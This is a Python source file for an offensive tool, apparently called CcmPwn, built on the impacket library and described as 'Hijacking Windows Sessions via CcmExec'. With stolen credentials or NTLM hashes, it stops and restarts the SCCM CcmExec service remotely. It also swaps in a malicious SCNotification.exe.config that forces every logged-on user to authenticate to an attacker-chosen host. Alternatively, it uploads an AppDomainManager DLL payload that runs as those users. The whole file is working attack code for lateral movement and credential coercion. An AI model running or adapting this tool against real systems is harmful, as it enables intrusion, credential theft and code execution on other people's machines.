#!/usr/bin/env python

#Copyright 2024 Google LLC
#
#Licensed under the Apache License, Version 2.0 (the "License");
#you may not use this file except in compliance with the License.
#You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
#Unless required by applicable law or agreed to in writing, software
#distributed under the License is distributed on an "AS IS" BASIS,
#WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#See the License for the specific language governing permissions and
#limitations under the License.

from __future__ import division
from __future__ import print_function
import sys
import argparse
import logging
import codecs
import time
import os
import re
import uuid
import base64

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version
from impacket.dcerpc.v5 import transport, rrp, scmr,lsat, lsad
from impacket.dcerpc.v5.ndr import NULL
from impacket.crypto import encryptSecret
from impacket.smbconnection import SMBConnection
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.smb3structs import *
from impacket.ldap import ldaptypes
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL, MAXIMUM_ALLOWED
from impacket.krb5.keytab import Keytab
from impacket.dcerpc.v5 import transport, rrp, scmr, rpcrt
from impacket.system_errors import ERROR_NO_MORE_ITEMS
from impacket.dcerpc.v5.samr import SID_NAME_USE
from impacket.dcerpc.v5.rpcrt import DCERPCException


class CCMEXEC:

    def __init__(self, username, password, domain, remoteName, options, port=445):
        self.__username = username
        self.__password = password
        self.__remoteName = remoteName
        self.__options = options
        self.__port = port
        self.__action = options.action.upper()
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__doKerberos = options.k
        self.__kdcHost = options.dc_ip

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def countdown(self, t): 
    
        while t: 
            mins, secs = divmod(t, 60) 
            timer = '{:02d}:{:02d}'.format(mins, secs) 
            print(timer, end="\r") 
            time.sleep(1) 
            t -= 1

    def run(self, remoteName, remoteHost):

        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
        logging.debug('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        rpctransport.setRemoteHost(remoteHost)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)

        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        self.ServiceActions(rpctransport)

    def run_action(self, action):

        smbclient = SMBConnection(self.__remoteName, options.target_ip, sess_port=int(options.port))
        if options.k is True:
            smbclient.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, options.dc_ip )
        else:
            smbclient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        
        if action == "add_malicious_config":
            
            fh = open('SCNotification.exe.config.original','wb')
            logging.info("Downloading original SCNotification.exe.config via SMB")
            smbclient.getFile('C$', 'Windows/CCM/SCNotification.exe.config', fh.write)
            fh.close()

            if options.method == 'smb':
                fh_template = open('./templates/smb_SCNotification.exe.config', 'r')
            elif options.method == 'http':
                fh_template = open('./templates/http_SCNotification.exe.config', 'r')
            else:
                logging.error('Incorrect authentication method. Please choose smb (default) or http')
                os.remove('SCNotification.exe.config.original')
                sys.stdout.flush()
                sys.exit(1)  

            fh_malicious = open('SCNotification.exe.config.malicious', 'w+')
            template = fh_template.read()
            template = template.replace("XXXX", options.computer)
            fh_malicious.write(template)
            fh_malicious.close()
            fh_template.close()
            
            fh_malicious = open('SCNotification.exe.config.malicious', 'r')
            smbclient.putFile('C$','Windows/CCM/SCNotification.exe.config', fh_malicious.read)   
            os.remove('SCNotification.exe.config.malicious')         
            logging.info("Uploading malicious SCNotification.exe.config via SMB")

        elif action == "remove_malicious_config":
            
            fh_original = open('SCNotification.exe.config.original', 'rb')
            smbclient.putFile('C$','Windows/CCM/SCNotification.exe.config', fh_original.read)
            os.remove('SCNotification.exe.config.original')
            logging.info("Cleaning up SCNotification.exe.config")

        elif action == "add_payloads":
            
            fh = open('SCNotification.exe.config.original','wb')
            logging.info("Downloading original SCNotification.exe.config via SMB")
            smbclient.getFile('C$', 'Windows/CCM/SCNotification.exe.config', fh.write)
            fh.close()

            fh_config = open(options.config, 'rb')
            smbclient.putFile('C$','Windows/CCM/SCNotification.exe.config',fh_config.read)
            logging.info("Uploading malicious SCNotification.exe.config via SMB")

            fh_dll = open(options.dll, 'rb')
            smbclient.putFile('C$','Windows/CCM/' + options.dll,fh_dll.read)
            logging.info("Uploading malicious DLL via SMB")

            tid = smbclient.connectTree('C$')
            fid = smbclient.openFile(tid,'Windows/CCM/' + options.dll, desiredAccess=MAXIMUM_ALLOWED)
            dacl = (
                b'\x01\x00\x04\x84\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x14\x00\x00\x00\x02\x00H\x00\x03\x00\x00\x00\x00\x00\x14\x00\xa9'
                b'\x00\x12\x00\x01\x01\x00\x00\x00\x00\x00\x05\x04\x00\x00\x00\x00'
                b'\x10\x14\x00\xff\x01\x1f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x12'
                b'\x00\x00\x00\x00\x10\x18\x00\xff\x01\x1f\x00\x01\x02\x00\x00\x00'
                b'\x00\x00\x05 \x00\x00\x00 \x02\x00\x00'
            )
            file_change = smbclient.getSMBServer().setInfo(tid, fid, inputBlob=dacl, infoType=SMB2_0_INFO_SECURITY, 
                fileInfoClass=SMB2_SEC_INFO_00, additionalInformation=DACL_SECURITY_INFORMATION)
            smbclient.closeFile(tid, fid)
                     
    def run_query(self):

        dcom = DCOMConnection(self.__remoteName, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)    

        descriptor, _ = iWbemServices.GetObject('StdRegProv')
        retVal = descriptor.EnumKey(2147483651,'\x00')
        descriptor.RemRelease()
        iWbemServices.RemRelease()
        dcom.disconnect()

        sidRegex = "^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$"
        index = 0
        users = list()
        while True:
            try:
                res = re.match(sidRegex, retVal.sNames[index])
                if res:
                    users.append(retVal.sNames[index])
                index += 1
            except:
                break

        smbclient = SMBConnection(self.__remoteName, options.target_ip, sess_port=int(options.port))
        if options.k is True:
            smbclient.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, options.dc_ip )
        else:
            smbclient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)


        lsaRpcBinding = r'ncacn_np:%s[\pipe\lsarpc]'
        rpc = transport.DCERPCTransportFactory(lsaRpcBinding)
        rpc.set_smb_connection(smbclient)
        dce = rpc.get_dce_rpc()
        dce.connect()
        
        dce.bind(lsat.MSRPC_UUID_LSAT)
        
        resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
        policyHandle = resp['PolicyHandle']
       
        try:
            resp = lsat.hLsarLookupSids(dce, policyHandle, users,lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
        except DCERPCException as e:
            if str(e).find('STATUS_NONE_MAPPED') >= 0:
                pass
            elif str(e).find('STATUS_SOME_NOT_MAPPED') >= 0:
                resp = e.get_packet()
            else: 
                raise
        if resp['TranslatedNames']['Names'] == []:
            logging.error("No one is currently logged on")
        else:
            for item in resp['TranslatedNames']['Names']:
                if item['Use'] != SID_NAME_USE.SidTypeUnknown:
                    logging.info("User %s\\%s is logged on %s" % (
                    resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name'], item['Name'],remoteName))
        dce.disconnect()

        
    def ServiceActions(self, rpctransport):
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)
        rpc = dce
        ans = scmr.hROpenSCManagerW(rpc)
        scManagerHandle = ans['lpScHandle']
        
        try:
            ans = scmr.hROpenServiceW(rpc, scManagerHandle, "CcmExec"+'\x00')
            serviceHandle = ans['lpServiceHandle']
        except Exception as e:
            logging.error("CcmExec service not accessible on remote system! :(")                
            return

        if self.__action == 'STATUS':
            logging.info("Querying status for CcmExec...")
            resp = scmr.hRQueryServiceStatus(rpc, serviceHandle)
            print("Status:", end=' ')
            state = resp['lpServiceStatus']['dwCurrentState']
            if state == scmr.SERVICE_CONTINUE_PENDING:
               print("CONTINUE PENDING")
            elif state == scmr.SERVICE_PAUSE_PENDING:
               print("PAUSE PENDING")
            elif state == scmr.SERVICE_PAUSED:
               print("PAUSED")
            elif state == scmr.SERVICE_RUNNING:
               print("RUNNING")
            elif state == scmr.SERVICE_START_PENDING:
               print("START PENDING")
            elif state == scmr.SERVICE_STOP_PENDING:
               print("STOP PENDING")
            elif state == scmr.SERVICE_STOPPED:
               print("STOPPED")
            else:
               print("UNKNOWN. CcmExec might not be installed on target!")

        elif self.__action == 'COERCE':
            resp = scmr.hRQueryServiceStatus(rpc, serviceHandle)
            state = resp['lpServiceStatus']['dwCurrentState']
            if state == scmr.SERVICE_RUNNING:           
                scmr.hRControlService(rpc, serviceHandle, scmr.SERVICE_CONTROL_STOP)
                self.run_action("add_malicious_config")
                logging.info("Stopping CcmExec service. Waiting 20 seconds to restart service.")
                self.countdown(20)
                logging.info("Starting CcmExec service. Wait around 30 seconds for SCNotification.exe to run config file.")
                scmr.hRStartServiceW(rpc, serviceHandle)
                self.countdown(30)
                self.run_action("remove_malicious_config")

            elif state == scmr.SERVICE_STOPPED:
                self.run_action("add_malicious_config")
                logging.info("CcmExec not running. Starting service.")
                logging.info("Starting CcmExec service. Wait around 30 seconds for SCNotification.exe to run config file.")
                scmr.hRStartServiceW(rpc, serviceHandle)
                self.countdown(30)
                self.run_action("remove_malicious_config")            

        elif self.__action == 'EXEC':
            resp = scmr.hRQueryServiceStatus(rpc, serviceHandle)
            state = resp['lpServiceStatus']['dwCurrentState']
            if state == scmr.SERVICE_RUNNING:           
                scmr.hRControlService(rpc, serviceHandle, scmr.SERVICE_CONTROL_STOP)
                self.run_action("add_payloads")
                logging.info("Stopping CcmExec service. Waiting 20 seconds to start service.")
                self.countdown(20)
                logging.info("Starting CcmExec service. Wait around 30 seconds for SCNotification.exe to run config file.")
                scmr.hRStartServiceW(rpc, serviceHandle)
                self.countdown(30)
                self.run_action("remove_malicious_config")

            elif state == scmr.SERVICE_STOPPED:
                self.run_action("add_payloads")
                logging.info("CcmExec not running. Starting service.")
                logging.info("Starting CcmExec service. Wait around 30 seconds for SCNotification.exe to run config file.")
                scmr.hRStartServiceW(rpc, serviceHandle)
                self.countdown(30)
                self.run_action("remove_malicious_config")

        elif self.__action == 'QUERY':
            resp = scmr.hRQueryServiceStatus(rpc, serviceHandle)
            state = resp['lpServiceStatus']['dwCurrentState']
            if state == scmr.SERVICE_RUNNING:           
                self.run_query()
            elif state == scmr.SERVICE_STOPPED:
                self.run_query()
        else:
            logging.error("Unknown action %s" % self.__action)

        scmr.hRCloseServiceHandle(rpc, scManagerHandle)
        dce.disconnect()

        return 

# Process command-line arguments.
if __name__ == '__main__':

    text_green = '\033[92m'
    text_blue = '\033[36m'
    text_yellow = '\033[93m'
    text_red = '\033[91m'
    text_end = '\033[0m'
    text_light_blue = '\033[1;36m'

    print(text_yellow + """
____ ____ _  _ ___  _ _ _ _  _ 
|    |    |\/| |__] | | | |\ | 
|___ |___ |  | |    |_|_| | \|  
                                   
v1.0.0\n""" + text_end)


    logger.init()
    if sys.stdout.encoding is None:
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    parser = argparse.ArgumentParser(add_help = True, description = "Hijacking Windows Sessions via CcmExec")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    subparsers = parser.add_subparsers(help='actions', dest='action')
 
    status_parser = subparsers.add_parser('status', help='returns CcmExec service status')

    status_parser = subparsers.add_parser('query', help='query remote users via WMI')

    create_parser = subparsers.add_parser('coerce', help='coerce SMB/HTTP authentication for all logged on users')
    create_parser.add_argument('-computer', action='store', required=True, help='computer for target to authenticate to')
    create_parser.add_argument('-method', action='store', required=False, help='authentication method (smb/http). Default: smb', default='smb')

    create_parser = subparsers.add_parser('exec', help='execute AppDomainManager DLL for all logged on users')
    create_parser.add_argument('-dll', action='store', required=True, help='AppDomainManager DLL payload')
    create_parser.add_argument('-config', action='store', required=True, help='Config file to run DLL payload')


    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store',metavar = "ip address", help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address", help='IP Address of the target machine. If '
                       'ommited it will use whatever was specified as target. This is useful when target is the NetBIOS '
                       'name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
 
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.target)

    if domain is None:
        domain = ''

    if options.target_ip is None:
        options.target_ip = remoteName

    if options.aesKey is not None:
        options.k = True

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.action == None:
        logging.error("No action specified. Please view help menu with -h")
        sys.stdout.flush()
        sys.exit(1)    
    else:
        ccmexec = CCMEXEC(username, password, domain, remoteName, options, int(options.port))
    try:
        ccmexec.run(remoteName, options.target_ip)
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
